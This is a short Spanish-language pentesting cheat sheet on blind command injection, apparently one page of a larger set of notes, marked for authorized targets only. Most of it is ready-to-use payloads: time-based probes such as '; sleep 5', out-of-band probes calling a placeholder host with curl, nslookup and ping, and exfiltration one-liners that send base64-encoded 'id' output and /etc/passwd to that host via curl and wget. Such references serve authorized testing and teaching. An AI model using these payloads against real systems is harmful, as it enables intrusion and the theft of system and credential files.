# Command Injection ciega

Ver índice: [command-injection.md](command-injection.md). **Solo sobre objetivos autorizados.** Cuando no ves la salida del comando.

## Confirmación por tiempo (time-based)

```bash
; sleep 5
& ping -n 5 127.0.0.1        # Windows
|| sleep 5 ||
```
Si la respuesta tarda ~5s de forma consistente → inyección.

## Confirmación out-of-band (OOB)

Provoca una interacción de red hacia tu servidor:
```bash
; curl http://TU-IP/$(whoami)
; nslookup `whoami`.TU-DOMINIO
; ping -c1 TU-IP
```
La petición entrante confirma la ejecución y puede **exfiltrar** (mete el output en el subdominio/URL).

## Exfiltración de datos

```bash
; curl http://TU-IP/?d=$(id | base64)
; wget http://TU-IP/?f=$(cat /etc/passwd | base64 -w0)
```

## Notas

- OOB es más fiable que time-based (menos falsos positivos por latencia).
- Ajusta a Windows (`&`, `nslookup`, `powershell`) si el backend lo es.
